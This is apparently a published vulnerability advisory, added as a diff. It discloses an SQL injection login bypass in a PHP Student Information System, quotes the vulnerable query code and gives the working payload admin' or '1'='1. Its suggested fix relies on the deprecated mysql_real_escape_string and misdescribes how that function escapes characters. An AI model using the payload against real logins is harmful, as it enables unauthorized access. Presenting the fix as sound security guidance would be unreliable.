@@ -1,0 +1,68 @@
+# Exploit Title............... Student Information System (SIS) Auth Bypass
+# Google Dork................. N/A
+# Date........................ 14/10/2016
+# Exploit Author.............. lahilote
+# Vendor Homepage............. http://www.sourcecodester.com/php/10902/student-information-system-sis.html
+# Software Link............... http://www.sourcecodester.com/sites/default/files/download/Bwire%20Charles/ucc.zip
+# Version..................... 0.1
+# Tested on................... xampp
+# CVE......................... N/A
+
+
+The audit_list in ucc/admin_login.php
+-------------------------------------
+
+----snip----
+
+error_reporting(E_ALL ^ E_DEPRECATED);
+if(isset($_POST['submit'])) {
+
+include 'database_config2.php';
+$myusername = $_POST['username'];
+$mypassword = $_POST['password'];
+
+
+
+	
+$query = "SELECT * FROM adminstrator WHERE USERNAME='$myusername' and PASSWORD='$mypassword'";
+$result = mysql_query($query);
+$count = mysql_num_rows($result);
+mysql_close();
+
+----snip----
+
+You can login with username and password: admin' or '1'='1
+
+
+How to fix
+----------
+One of the method's to fix and secure such Auth Bypass flaw's, is to use the php function mysql_real_escape_string.
+It causes that every of this characters \x00, \n, \r, \, '
+get's replaced with a simple Backslash „/“, so the attackers commands become useless.
+
+   Example:
+
+error_reporting(E_ALL ^ E_DEPRECATED);
+if(isset($_POST['submit'])) {
+
+include 'database_config2.php';
+$myusername = mysql_real_escape_string($_POST['username']);
+$mypassword = mysql_real_escape_string($_POST['password']);
+
+
+
+	
+$query = "SELECT * FROM adminstrator WHERE USERNAME='$myusername' and PASSWORD='$mypassword'";
+$result = mysql_query($query);
+$count = mysql_num_rows($result);
+mysql_close();
+
+
+Credits
+-------
+This vulnerability was discovered and researched by lahilote
+
+References
+----------
+http://www.sourcecodester.com/php/10902/student-information-system-sis.html
+http://php.net/manual/en/function.mysql-real-escape-string.php
